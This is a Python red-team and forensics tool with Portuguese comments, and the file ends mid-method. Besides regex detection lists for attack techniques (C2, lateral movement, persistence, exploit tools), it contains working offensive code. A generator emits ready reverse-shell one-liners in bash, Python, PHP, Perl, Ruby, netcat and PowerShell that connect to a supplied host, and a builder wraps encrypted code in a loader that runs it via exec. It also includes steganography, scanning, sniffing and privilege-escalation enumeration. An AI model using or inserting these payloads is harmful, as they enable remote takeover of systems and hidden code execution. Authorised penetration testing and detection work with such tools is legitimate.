#!/usr/bin/env python3
"""
================================================================================
PYFORENSIC-RED: Ferramenta Avançada de Análise Forense e Simulação de Red Team
================================================================================
DESCRIÇÃO: Ferramenta para análise forense, emulação de adversários e testes
           de penetração com técnicas MITRE ATT&CK integradas
VERSÃO: 3.0 - OPERAÇÃO CRIMSON
AUTOR: Time Vermelho
CLASSIFICAÇÃO: RESTRITO - USO APENAS EM AMBIENTES AUTORIZADOS
================================================================================
"""

import os
import re
import sys
import json
import argparse
import ipaddress
import hashlib
import base64  # <- Adicione esta linha aqui
import tarfile
import zipfile
import platform
import sqlite3
import asyncio
import socket
import struct
import random
import string
import time
import subprocess
import concurrent.futures
from datetime import datetime, timedelta
from collections import defaultdict, Counter, deque
from pathlib import Path
from typing import Dict, List, Set, Tuple, Optional, Any, Callable, Union
from enum import Enum
import logging
import warnings

# Suprimir warnings específicos
warnings.filterwarnings('ignore', category=DeprecationWarning)

# Bibliotecas avançadas
try:
    import numpy as np
    import pandas as pd
    from scipy import stats
    from sklearn.ensemble import IsolationForest
    from sklearn.cluster import DBSCAN
    import networkx as nx
    PLOTTING_AVAILABLE = True
except ImportError:
    PLOTTING_AVAILABLE = False

try:
    import cryptography
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import scapy.all as scapy
    from scapy.layers import http
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import paramiko
    import pymongo
    import psycopg2
    import redis
    import pymssql
    DATABASE_AVAILABLE = True
except ImportError:
    DATABASE_AVAILABLE = False

try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

try:
    import requests
    from bs4 import BeautifulSoup
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

# Configuração avançada de logging
class RedTeamFormatter(logging.Formatter):
    """Formatter customizado para operações Red Team"""
    
    FORMATS = {
        logging.DEBUG: '🌀 [DEBUG] %(message)s',
        logging.INFO: '📡 [INFO] %(message)s',
        logging.WARNING: '⚠️ [WARNING] %(message)s',
        logging.ERROR: '🔥 [ERROR] %(message)s',
        logging.CRITICAL: '💀 [CRITICAL] %(message)s'
    }
    
    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt, datefmt='%Y-%m-%d %H:%M:%S')
        return formatter.format(record)

# Configurar logger principal
logger = logging.getLogger('pyforensic_red')
logger.setLevel(logging.INFO)

# Handler para console
ch = logging.StreamHandler()
ch.setLevel(logging.INFO)
ch.setFormatter(RedTeamFormatter())
logger.addHandler(ch)

# Handler para arquivo
fh = logging.FileHandler('pyforensic_red_operation.log')
fh.setLevel(logging.DEBUG)
fh.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
logger.addHandler(fh)

class ThreatLevel(Enum):
    """Níveis de ameaça baseados em técnicas Red Team"""
    RECON = 1
    WEAPONIZATION = 2
    DELIVERY = 3
    EXPLOITATION = 4
    INSTALLATION = 5
    C2 = 6
    ACTION = 7
    PERSISTENCE = 8
    DEFENSE_EVASION = 9
    CREDENTIAL_ACCESS = 10
    DISCOVERY = 11
    LATERAL_MOVEMENT = 12
    COLLECTION = 13
    EXFILTRATION = 14
    IMPACT = 15

class AttackTactic(Enum):
    """Táticas MITRE ATT&CK"""
    RECONNAISSANCE = "TA0043"
    RESOURCE_DEVELOPMENT = "TA0042"
    INITIAL_ACCESS = "TA0001"
    EXECUTION = "TA0002"
    PERSISTENCE = "TA0003"
    PRIVILEGE_ESCALATION = "TA0004"
    DEFENSE_EVASION = "TA0005"
    CREDENTIAL_ACCESS = "TA0006"
    DISCOVERY = "TA0007"
    LATERAL_MOVEMENT = "TA0008"
    COLLECTION = "TA0009"
    COMMAND_AND_CONTROL = "TA0011"
    EXFILTRATION = "TA0010"
    IMPACT = "TA0040"

class RedTeamTechniques:
    """Técnicas de Red Team e TTPs (Tactics, Techniques, Procedures)"""
    
    TECHNIQUES = {
        "T1595": {"name": "Active Scanning", "tactic": "RECONNAISSANCE"},
        "T1589": {"name": "Gather Victim Identity Information", "tactic": "RECONNAISSANCE"},
        "T1190": {"name": "Exploit Public-Facing Application", "tactic": "INITIAL_ACCESS"},
        "T1133": {"name": "External Remote Services", "tactic": "PERSISTENCE"},
        "T1059": {"name": "Command and Scripting Interpreter", "tactic": "EXECUTION"},
        "T1078": {"name": "Valid Accounts", "tactic": "DEFENSE_EVASION"},
        "T1003": {"name": "OS Credential Dumping", "tactic": "CREDENTIAL_ACCESS"},
        "T1018": {"name": "Remote System Discovery", "tactic": "DISCOVERY"},
        "T1021": {"name": "Remote Services", "tactic": "LATERAL_MOVEMENT"},
        "T1048": {"name": "Exfiltration Over Alternative Protocol", "tactic": "EXFILTRATION"},
        "T1489": {"name": "Service Stop", "tactic": "IMPACT"},
        "T1562": {"name": "Impair Defenses", "tactic": "DEFENSE_EVASION"},
        "T1055": {"name": "Process Injection", "tactic": "DEFENSE_EVASION"},
        "T1548": {"name": "Abuse Elevation Control Mechanism", "tactic": "PRIVILEGE_ESCALATION"},
        "T1204": {"name": "User Execution", "tactic": "EXECUTION"},
        "T1574": {"name": "Hijack Execution Flow", "tactic": "PERSISTENCE"},
        "T1098": {"name": "Account Manipulation", "tactic": "PERSISTENCE"},
        "T1210": {"name": "Exploitation of Remote Services", "tactic": "LATERAL_MOVEMENT"},
        "T1046": {"name": "Network Service Scanning", "tactic": "DISCOVERY"},
        "T1105": {"name": "Ingress Tool Transfer", "tactic": "COMMAND_AND_CONTROL"}
    }
    
    # Padrões de IOCs avançados para Red Team
    C2_PATTERNS = [
        # Padrões de comunicação C2
        r"\.onion($|/)",  # Tor hidden services
        r"\.xyz($|/)",    # Domínios suspeitos
        r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{4,5}",  # IP:Porta alta
        r"https?://[^/]+/api/v\d+/",  # APIs suspeitas
        r"user-agent:.*(python|curl|wget|powershell)",  # User agents não-browser
        r"(cmd\.exe|powershell|bash|sh).*-(enc|-e|-c)",  # Comandos encoded
        r"base64.*[a-zA-Z0-9+/]{50,}={0,2}",  # Base64 suspeito
        r"eval\(.*\)",  # JavaScript eval
        r"fromCharCode.*\(.*\)",  # Char code obfuscation
        r"document\.write.*String",  # Dynamic string writing
        r"setTimeout.*function",  # Timing attacks
        r"XMLHttpRequest",  # AJAX C2
        r"WebSocket",  # WebSocket C2
        r".*\.php\?id=[a-f0-9]{32}",  # PHP webshells
        r".*\.asp\?.*cmd=",  # ASP webshells
        r".*\.jsp\?.*pass="  # JSP webshells
    ]
    
    LATERAL_MOVEMENT = [
        # Padrões de movimento lateral
        r"psexec.*-s.*cmd",  # PsExec
        r"wmic.*process.*call",  # WMI
        r"schtasks.*/create.*/tr",  # Scheduled tasks
        r"sc.*\\\\[^\\]+.*create",  # Service creation
        r"at\\\\[^\\]+.*[0-9]{2}:[0-9]{2}",  # AT command
        r"net.*use.*\\\\[^\\]+",  # Net use
        r"copy.*\\\\[^\\]+",  # File copy over network
        r"invoke-command.*-computername",  # PowerShell remoting
        r"enter-pssession",  # PowerShell sessions
        r"smbclient.*-L",  # SMB enumeration
        r"nmap.*-sS.*-p.*[0-9]+",  # Port scanning
        r"crackmapexec.*smb",  # Credential testing
        r"responder.*-I",  # LLMNR/NBT-NS poisoning
        r"bloodhound.*collect",  # BloodHound data collection
        r"secretsdump.*-just-dc"  # DCSync attack
    ]
    
    PERSISTENCE_TECHNIQUES = [
        # Técnicas de persistência
        r"reg.*add.*HKLM.*Run",  # Registry run keys
        r"schtasks.*/create.*/tn",  # Scheduled tasks
        r"New-ScheduledTaskAction",  # PowerShell scheduled tasks
        r"Set-ItemProperty.*registry",  # PowerShell registry
        r"Startup.*folder",  # Startup folder
        r"service.*create.*binpath",  # Service creation
        r"wmic.*process.*startup",  # WMI event subscription
        r"Add-MpPreference.*-ExclusionPath",  # Windows Defender exclusion
        r"autoruns.*/accepteula",  # Sysinternals Autoruns
        r"bcedit.*/set.*bootstatuspolicy",  # Boot configuration
        r"New-ItemProperty.*-Path.*HKLM",  # More registry
        r"GPO.*update",  # Group Policy Objects
        r"task.*/create.*/xml",  # XML scheduled tasks
        r"COM.*hijacking",  # COM object hijacking
        r"IFEO.*debugger"  # Image File Execution Options
    ]
    
    EXPLOITATION_PATTERNS = [
        # Padrões de exploração
        r"msfconsole.*use.*exploit",  # Metasploit
        r"python.*-c.*import.*socket",  # Python exploits
        r"gcc.*-o.*exploit",  # Compiling exploits
        r"chmod.*\+x.*exploit",  # Making exploits executable
        r"perl.*-e.*socket",  # Perl exploits
        r"java.*-jar.*ysoserial",  # Java deserialization
        r"sqlmap.*-u.*--dbs",  # SQL injection
        r"nmap.*--script.*vuln",  # Vulnerability scanning
        r"searchsploit.*[a-zA-Z0-9]+",  # ExploitDB
        r"rdesktop.*-u.*-p",  # RDP brute force
        r"hydra.*-l.*-P.*ssh",  # Hydra attacks
        r"john.*--format.*nt",  # Password cracking
        r"hashcat.*-m.*1000",  # Hash cracking
        r"responder.*-wrf",  # NTLM relay
        r"ntlmrelayx.*-tf",  # More NTLM relay
        r"bloodhound-python.*-c",  # BloodHound Python
        r"crackmapexec.*--local-auth"  # Local auth attacks
    ]
    
    @classmethod
    def detect_ttp(cls, log_entry: str) -> List[Dict]:
        """Detecta TTPs (Tactics, Techniques, Procedures) em entradas de log"""
        detected_ttps = []
        
        # Verificar cada técnica
        for tech_id, tech_info in cls.TECHNIQUES.items():
            patterns = cls._get_patterns_for_technique(tech_id)
            for pattern in patterns:
                if re.search(pattern, log_entry, re.IGNORECASE):
                    detected_ttps.append({
                        "technique_id": tech_id,
                        "technique_name": tech_info["name"],
                        "tactic": tech_info["tactic"],
                        "confidence": 0.8,
                        "evidence": re.search(pattern, log_entry, re.IGNORECASE).group()
                    })
                    break
        
        return detected_ttps
    
    @classmethod
    def _get_patterns_for_technique(cls, technique_id: str) -> List[str]:
        """Retorna padrões regex para uma técnica específica"""
        technique_patterns = {
            "T1595": cls.C2_PATTERNS + [r"scan.*port", r"nmap", r"masscan"],
            "T1059": [r"cmd\.exe", r"powershell", r"bash", r"sh", r"python.*-c"],
            "T1003": [r"mimikatz", r"lsass", r"procdump", r"sekurlsa"],
            "T1021": cls.LATERAL_MOVEMENT,
            "T1048": cls.C2_PATTERNS,
            "T1078": [r"valid.*account", r"domain.*admin", r"kerberos.*ticket"],
            "T1133": cls.PERSISTENCE_TECHNIQUES,
            "T1210": cls.EXPLOITATION_PATTERNS,
            "T1562": [r"disable.*firewall", r"stop.*service", r"uninstall.*av"],
            "T1548": [r"bypassuac", r"runas", r"sudo.*-i"],
            "T1204": [r"click.*link", r"open.*attachment", r"macros"],
            "T1574": [r"dll.*hijack", r"ld_preload", r"image.*hijack"]
        }
        
        return technique_patterns.get(technique_id, [])

class Steganography:
    """Técnicas de esteganografia para ocultação de dados"""
    
    @staticmethod
    def hide_in_png(image_path: str, data: bytes, output_path: str) -> bool:
        """Esconde dados em uma imagem PNG usando LSB (Least Significant Bit)"""
        try:
            from PIL import Image
            import bitarray
            
            img = Image.open(image_path)
            if img.mode not in ('RGB', 'RGBA'):
                img = img.convert('RGB')
            
            # Converter dados para bits
            bits = bitarray.bitarray()
            bits.frombytes(data)
            
            # Adicionar marcador de fim
            end_marker = bitarray.bitarray()
            end_marker.frombytes(b'END')
            bits.extend(end_marker)
            
            # Embed nos pixels
            pixels = list(img.getdata())
            new_pixels = []
            bit_index = 0
            
            for pixel in pixels:
                if bit_index >= len(bits):
                    new_pixels.append(pixel)
                    continue
                
                r, g, b = pixel[:3]
                
                # Modificar o LSB de cada canal
                if bit_index < len(bits):
                    r = (r & ~1) | bits[bit_index]
                    bit_index += 1
                
                if bit_index < len(bits):
                    g = (g & ~1) | bits[bit_index]
                    bit_index += 1
                
                if bit_index < len(bits):
                    b = (b & ~1) | bits[bit_index]
                    bit_index += 1
                
                if len(pixel) == 4:
                    new_pixels.append((r, g, b, pixel[3]))
                else:
                    new_pixels.append((r, g, b))
            
            # Criar nova imagem
            new_img = Image.new(img.mode, img.size)
            new_img.putdata(new_pixels)
            new_img.save(output_path)
            
            return True
            
        except Exception as e:
            logger.error(f"Erro em esteganografia: {e}")
            return False
    
    @staticmethod
    def extract_from_png(image_path: str) -> Optional[bytes]:
        """Extrai dados escondidos de uma imagem PNG"""
        try:
            from PIL import Image
            import bitarray
            
            img = Image.open(image_path)
            pixels = list(img.getdata())
            
            bits = bitarray.bitarray()
            for pixel in pixels:
                r, g, b = pixel[:3]
                bits.append(r & 1)
                bits.append(g & 1)
                bits.append(b & 1)
            
            # Encontrar marcador de fim
            data_bytes = bits.tobytes()
            end_pos = data_bytes.find(b'END')
            
            if end_pos != -1:
                return data_bytes[:end_pos]
            
            return None
            
        except Exception as e:
            logger.error(f"Erro ao extrair dados: {e}")
            return None

class CryptoOps:
    """Operações criptográficas para Red Team"""
    
    @staticmethod
    def generate_aes_key(password: str, salt: bytes = None) -> bytes:
        """Gera uma chave AES a partir de uma senha"""
        if salt is None:
            salt = os.urandom(16)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key
    
    @staticmethod
    def encrypt_file(file_path: str, key: bytes) -> str:
        """Criptografa um arquivo com AES"""
        try:
            fernet = Fernet(key)
            
            with open(file_path, 'rb') as f:
                data = f.read()
            
            encrypted = fernet.encrypt(data)
            
            output_path = f"{file_path}.encrypted"
            with open(output_path, 'wb') as f:
                f.write(encrypted)
            
            return output_path
            
        except Exception as e:
            logger.error(f"Erro ao criptografar: {e}")
            return None
    
    @staticmethod
    def decrypt_file(file_path: str, key: bytes) -> str:
        """Descriptografa um arquivo"""
        try:
            fernet = Fernet(key)
            
            with open(file_path, 'rb') as f:
                encrypted = f.read()
            
            decrypted = fernet.decrypt(encrypted)
            
            output_path = file_path.replace('.encrypted', '.decrypted')
            with open(output_path, 'wb') as f:
                f.write(decrypted)
            
            return output_path
            
        except Exception as e:
            logger.error(f"Erro ao descriptografar: {e}")
            return None
    
    @staticmethod
    def create_self_decrypting_payload(encrypted_data: bytes, key: bytes) -> str:
        """Cria um payload auto-extraível/auto-descritografável"""
        template = '''
import base64
from cryptography.fernet import Fernet

# Dados criptografados
ENCRYPTED = {encrypted}

# Chave
KEY = {key}

# Decriptar
fernet = Fernet(KEY)
decrypted = fernet.decrypt(ENCRYPTED)

# Executar
exec(decrypted.decode())
'''
        
        encrypted_b64 = base64.b64encode(encrypted_data).decode()
        key_b64 = base64.b64encode(key).decode()
        
        payload = template.format(encrypted=repr(encrypted_b64), key=repr(key_b64))
        
        return payload

class NetworkOperatives:
    """Operações de rede para Red Team"""
    
    def __init__(self):
        self.packet_queue = deque(maxlen=1000)
        self.connections = {}
        
    @staticmethod
    def scan_network(subnet: str, ports: List[int] = None) -> Dict:
        """Escaneamento de rede com fingerprinting"""
        if not NMAP_AVAILABLE:
            logger.warning("nmap não disponível")
            return {}
        
        try:
            nm = nmap.PortScanner()
            
            if ports is None:
                ports = "21-23,25,53,80,110,111,135,139,143,443,445,993,995,1433,3306,3389,5432,5900,8080"
            
            logger.info(f"Escaneando rede: {subnet}")
            nm.scan(hosts=subnet, arguments=f"-sS -p {ports} -T4")
            
            results = {}
            for host in nm.all_hosts():
                host_info = {
                    'state': nm[host].state(),
                    'hostnames': nm[host].hostnames(),
                    'ports': {}
                }
                
                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    for port in ports:
                        port_info = nm[host][proto][port]
                        host_info['ports'][port] = {
                            'state': port_info['state'],
                            'service': port_info.get('name', 'unknown'),
                            'version': port_info.get('version', ''),
                            'product': port_info.get('product', '')
                        }
                
                results[host] = host_info
            
            return results
            
        except Exception as e:
            logger.error(f"Erro no scan: {e}")
            return {}
    
    @staticmethod
    def sniff_traffic(interface: str = None, count: int = 100) -> List:
        """Sniff de pacotes de rede"""
        if not SCAPY_AVAILABLE:
            logger.warning("scapy não disponível")
            return []
        
        try:
            packets = []
            
            def packet_callback(packet):
                packets.append(packet)
                if len(packets) >= count:
                    return True
            
            if interface:
                scapy.sniff(iface=interface, prn=packet_callback, store=False, count=count)
            else:
                scapy.sniff(prn=packet_callback, store=False, count=count)
            
            return packets
            
        except Exception as e:
            logger.error(f"Erro no sniff: {e}")
            return []
    
    @staticmethod
    def analyze_packets(packets: List) -> Dict:
        """Análise de pacotes capturados"""
        analysis = {
            'protocols': defaultdict(int),
            'ips': defaultdict(int),
            'ports': defaultdict(int),
            'suspicious': []
        }
        
        for packet in packets:
            # Contar protocolos
            if packet.haslayer(scapy.IP):
                analysis['protocols']['IP'] += 1
                src_ip = packet[scapy.IP].src
                dst_ip = packet[scapy.IP].dst
                analysis['ips'][src_ip] += 1
                analysis['ips'][dst_ip] += 1
            
            if packet.haslayer(scapy.TCP):
                analysis['protocols']['TCP'] += 1
                src_port = packet[scapy.TCP].sport
                dst_port = packet[scapy.TCP].dport
                analysis['ports'][src_port] += 1
                analysis['ports'][dst_port] += 1
            
            if packet.haslayer(scapy.UDP):
                analysis['protocols']['UDP'] += 1
            
            # Detectar atividades suspeitas
            if packet.haslayer(scapy.Raw):
                payload = str(packet[scapy.Raw].load)
                
                # Verificar por IOCs
                iocs = RedTeamTechniques.C2_PATTERNS + RedTeamTechniques.LATERAL_MOVEMENT
                for pattern in iocs:
                    if re.search(pattern, payload, re.IGNORECASE):
                        analysis['suspicious'].append({
                            'packet': packet.summary(),
                            'pattern': pattern,
                            'payload': payload[:100]
                        })
                        break
        
        return analysis
    
    @staticmethod
    def create_reverse_shell_payload(lhost: str, lport: int, platform: str = "linux") -> str:
        """Gera payloads de reverse shell"""
        payloads = {
            "linux": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "nc_traditional": f"nc.traditional -e /bin/sh {lhost} {lport}",
            "ncat": f"ncat {lhost} {lport} -e /bin/bash",
            "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        }
        
        return payloads.get(platform, payloads["linux"])

class PostExploitation:
    """Técnicas de pós-exploração"""
    
    @staticmethod
    def gather_system_info() -> Dict:
        """Coleta informações do sistema comprometido"""
        info = {
            'system': {},
            'network': {},
            'users': [],
            'processes': [],
            'services': [],
            'scheduled_tasks': []
        }
        
        try:
            # Informações do sistema
            info['system']['platform'] = platform.platform()
            info['system']['hostname'] = platform.node()
            info['system']['architecture'] = platform.machine()
            info['system']['processor'] = platform.processor()
            
            # Informações de rede
            import netifaces
            for iface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    info['network'][iface] = addrs[netifaces.AF_INET]
            
            # Usuários (simplificado)
            if platform.system() == 'Windows':
                # Comando Windows
                pass
            else:
                # Comando Linux
                try:
                    with open('/etc/passwd', 'r') as f:
                        users = [line.split(':')[0] for line in f.readlines()]
                        info['users'] = users[:20]  # Limitar
                except:
                    pass
            
            # Processos
            import psutil
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    info['processes'].append(proc.info)
                except:
                    continue
            
            # Limitar número de processos
            info['processes'] = info['processes'][:50]
            
        except Exception as e:
            logger.error(f"Erro ao coletar informações: {e}")
        
        return info
    
    @staticmethod
    def check_privesc_vectors() -> List[Dict]:
        """Verifica vetores de escalação de privilégio"""
        vectors = []
        
        # Verificações comuns
        checks = [
            {
                'name': 'SUID Binaries',
                'command': 'find / -perm -4000 -type f 2>/dev/null',
                'platform': 'linux'
            },
            {
                'name': 'Writable Directories',
                'command': 'find / -type d -perm -o+w 2>/dev/null',
                'platform': 'linux'
            },
            {
                'name': 'Crontab Entries',
                'command': 'crontab -l 2>/dev/null',
                'platform': 'linux'
            },
            {
                'name': 'Sudo Permissions',
                'command': 'sudo -l',
                'platform': 'linux'
            },
            {
                'name': 'Capabilities',
                'command': 'getcap -r / 2>/dev/null',
                'platform': 'linux'
            }
        ]
        
        for check in checks:
            if check['platform'] in platform.platform().lower():
                try:
                    result = subprocess.run(
                        check['command'],
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    
                    if result.stdout.strip():
                        vectors.append({
                            'vector': check['name'],
                            'output': result.stdout[:500]  # Limitar tamanho
                        })
                except:
                    continue
        
        return vectors
    
    @staticmethod
    def dump_credentials() -> Dict:
        """Tenta extrair credenciais (para ambientes autorizados!)"""
        credentials = {
            'hashes': [],
            'passwords': [],
            'tickets': []
        }
        
        # AVISO: Esta função é apenas para fins educacionais
        # em ambientes de teste controlados
        
        if platform.system() == 'Windows':
            # Técnicas Windows
            pass
        else:
            # Técnicas Linux
            pass
        
        return credentials

class AdvancedLogAnalyzer:
    """Analisador avançado de logs com técnicas Red Team"""
    
    def __init__(self, config_path: str = None):
        self.config = self.load_config(config_path)
        self.ttp_detector = RedTeamTechniques()
        self.network_ops = NetworkOperatives()
        self.post_exploit = PostExploitation()
        
        # Banco de dados para IOCs e TTPs
        self.setup_ttp_database()
        
        # Machine Learning para detecção de anomalias
        self.anomaly_detector = self.setup_anomaly_detector()
        
        # Grafos para análise de relacionamentos
        self.attack_graph = nx.DiGraph()
        
    def load_config(self, config_path: str = None) -> Dict:
        """Carrega configuração avançada"""
        default_config = {
            'analysis': {
                'deep_learning': True,
                'behavioral_analysis': True,
                'temporal_correlation': True,
                'threat_hunting': True,
                'ioc_extraction': True
            },
            'ttp_detection': {
                'mitre_attack': True,
                'custom_ttps': True,
                'confidence_threshold': 0.7
            },
            'reporting': {
                'attack_narrative': True,
                'kill_chain': True,
                'attack_graph': True,
                'ioc_report': True,
                'ttps_report': True
            },
            'simulation': {
                'enable': False,
                'scenarios': ['apt29', 'carbon_spider', 'lazarus'],
                'intensity': 'medium'
            }
        }
        
        if config_path and os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    user_config = yaml.safe_load(f)
                    # Mesclar configurações
                    import copy
                    merged = copy.deepcopy(default_config)
                    self.merge_dicts(merged, user_config)
                    return merged
            except Exception as e:
                logger.error(f"Erro ao carregar config: {e}")
        
        return default_config
    
    def merge_dicts(self, d1: Dict, d2: Dict):
        """Mescla dicionários recursivamente"""
        for k, v in d2.items():
            if k in d1 and isinstance(d1[k], dict) and isinstance(v, dict):
                self.merge_dicts(d1[k], v)
            else:
                d1[k] = v
    
    def setup_ttp_database(self):
        """Configura banco de dados de TTPs"""
        self.ttp_db = sqlite3.connect(':memory:')
        cursor = self.ttp_db.cursor()
        
        cursor.execute('''
            CREATE TABLE ttps (
                technique_id TEXT PRIMARY KEY,
                technique_name TEXT,
                tactic TEXT,
                description TEXT,
                detection_guidance TEXT,
                mitigation TEXT,
                examples TEXT
            )
        ''')
        
        # Inserir técnicas MITRE ATT&CK
        for tech_id, tech_info in RedTeamTechniques.TECHNIQUES.items():
            cursor.execute('''
                INSERT INTO ttps VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                tech_id,
                tech_info['name'],
                tech_info['tactic'],
                'Técnica de Red Team',
                'Monitorar logs para padrões específicos',
                'Implementar controles de segurança apropriados',
                'Exemplos de implementação'
            ))
        
        self.ttp_db.commit()
    
    def setup_anomaly_detector(self):
        """Configura detector de anomalias com ML"""
        if not PLOTTING_AVAILABLE:
            return None
        
        try:
            # Usar Isolation Forest para detecção de anomalias
            detector = IsolationForest(
                n_estimators=100,
                contamination=0.1,
                random_state=42,
                n_jobs=-1
            )
            return detector
        except Exception as e:
            logger.error(f"Erro ao configurar detector: {e}")
            return None
    
    def analyze_with_ai(self, log_data: pd.DataFrame) -> Dict:
        """Análise avançada com IA/ML"""
        results = {
            'anomalies': [],
            'clusters': [],
            'predictions': [],
            'behavioral_patterns': []
        }
        
        if self.anomaly_detector is None or log_data.empty:
            return results
        
        try:
            # Preparar features
            features = self.extract_features(log_data)
            
            if features.shape[0] > 10:  # Precisa de dados suficientes
                # Detecção de anomalias
                anomaly_scores = self.anomaly_detector.fit_predict(features)
                anomalies = np.where(anomaly_scores == -1)[0]
                
                for idx in anomalies[:20]:  # Limitar saída
                    results['anomalies'].append({
                        'index': int(idx),
                        'data': log_data.iloc[idx].to_dict(),
                        'score': float(anomaly_scores[idx])
                    })
                
                # Clusterização
                if len(anomalies) > 5:
                    clusterer = DBSCAN(eps=0.5, min_samples=2)
                    clusters = clusterer.fit_predict(features.iloc[anomalies])
                    
                    for cluster_id in np.unique(clusters):
                        if cluster_id != -1:  # Ignorar outliers
                            cluster_indices = anomalies[clusters == cluster_id]
                            results['clusters'].append({
                                'cluster_id': int(cluster_id),
                                'size': len(cluster_indices),
                                'indices': cluster_indices.tolist()
                            })
            
            # Análise comportamental
            results['behavioral_patterns'] = self.analyze_behavior(log_data)
            
        except Exception as e:
            logger.error(f"Erro na análise com IA: {e}")
        
        return results
    
    def extract_features(self, log_data: pd.DataFrame) -> pd.DataFrame:
        """Extrai features para ML dos logs"""
        features = []
        
        # Features básicas
        if 'timestamp' in log_data.columns:
            log_data['hour'] = pd.to_datetime(log_data['timestamp']).dt.hour
            log_data['day'] = pd.to_datetime(log_data['timestamp']).dt.dayofweek
            features.extend(['hour', 'day'])
        
        if 'status_code' in log_data.columns:
            features.append('status_code')
        
        if 'size' in log_data.columns:
            features.append('size')
        
        # Features derivadas
        if len(features) > 0:
            return log_data[features].fillna(0)
        
        return pd.DataFrame()
    
    def analyze_behavior(self, log_data: pd.DataFrame) -> List[Dict]:
        """Análise comportamental avançada"""
        behaviors = []
        
        try:
            # Detectar comportamentos suspeitos
            if 'source_ip' in log_data.columns and 'timestamp' in log_data.columns:
                # Agrupar por IP e analisar padrões temporais
                grouped = log_data.groupby('source_ip')
                
                for ip, group in grouped:
                    if len(group) > 10:  # IPs com atividade significativa
                        times = pd.to_datetime(group['timestamp'])
                        
                        # Calcular métricas
                        time_diff = times.diff().dt.total_seconds()
                        
                        behavior = {
                            'ip': ip,
                            'request_count': len(group),
                            'avg_time_between_requests': float(time_diff.mean()),
                            'burst_score': self.calculate_burst_score(time_diff),
                            'regularity_score': self.calculate_regularity_score(times)
                        }
                        
                        # Adicionar flags
                        flags = []
                        if behavior['burst_score'] > 0.8:
                            flags.append('BURST_ACTIVITY')
                        if behavior['regularity_score'] > 0.7:
                            flags.append('AUTOMATED_PATTERN')
                        
                        if flags:
                            behavior['flags'] = flags
                            behaviors.append(behavior)
        
        except Exception as e:
            logger.error(f"Erro na análise comportamental: {e}")
        
        return behaviors
    
    def calculate_burst_score(self, time_diffs: pd.Series) -> float:
        """Calcula score de atividade em bursts"""
        if len(time_diffs) < 2:
            return 0.0
        
        # Identificar clusters temporais
        try:
            from scipy.cluster.hierarchy import fcluster, linkage
            from scipy.spatial.distance import pdist
            
            # Usar clustering hierárquico
            if len(time_diffs) > 2:
                Z = linkage(time_diffs.values.reshape(-1, 1), 'ward')
                clusters = fcluster(Z, t=2, criterion='distance')
                
                # Score baseado na variância intra-cluster
                score = 1 - (np.var([time_diffs[clusters == i].mean() 
                                   for i in np.unique(clusters)]) / time_diffs.var())
                return min(max(score, 0), 1)
        except:
            pass
        
        return 0.0
    
    def calculate_regularity_score(self, times: pd.Series) -> float:
        """Calcula score de regularidade/automação"""
        if len(times) < 3:
            return 0.0
        
        # Calcular diferenças entre requisições
        diffs = times.diff().dt.total_seconds().dropna()
        
        if len(diffs) < 2:
            return 0.0
        
        # Score baseado no coeficiente de variação
        cv = diffs.std() / diffs.mean() if diffs.mean() > 0 else 1
        
        # Baixo CV indica alta regularidade
        return 1 - min(cv, 1)
    
    def detect_attack_chain(self, logs: List[Dict]) -> Dict:
